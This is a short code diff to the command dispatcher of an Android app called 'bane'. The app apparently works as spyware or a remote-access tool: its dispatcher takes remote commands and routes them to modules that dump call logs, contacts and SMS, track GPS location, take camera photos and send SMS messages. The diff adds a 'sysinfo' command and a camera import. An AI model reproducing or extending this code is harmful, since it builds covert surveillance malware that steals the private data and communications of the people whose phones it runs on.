@@ -1,11 +1,15 @@
 package com.example.bane.dispatcher;
 
+import android.content.Intent;
+
 import com.bane.model.*;
+import com.example.bane.bane.camera.CameraPhoto;
 import com.example.bane.bane.dumper.CallsDumper;
 import com.example.bane.bane.dumper.ContactsDumper;
 import com.example.bane.bane.dumper.SMSDumper;
 import com.example.bane.bane.gps.Tracker;
 import com.example.bane.bane.sms.SMSSender;
+import com.example.bane.bane.sysinfo.SysInfo;
 import com.example.bane.connection.Connection;
 import com.example.bane.BaneService;
 import com.example.bane.bane.storage.Storage;
@@ -59,7 +63,9 @@ public class DefaultDispatcher extends Dispatcher {
             while (m.find())
                 list.add(m.group(1));
             return SMSSender.sendSMS(list.get(1),list.get(2).substring(1,list.get(2).length()-1));
-        } else {
+        } else if(command.contains("sysinfo")){
+            return SysInfo.sysinfo();
+        }else {
             return new BaneObject(BaneCode.ERROR,"Command not recognized",null);
         }
     }
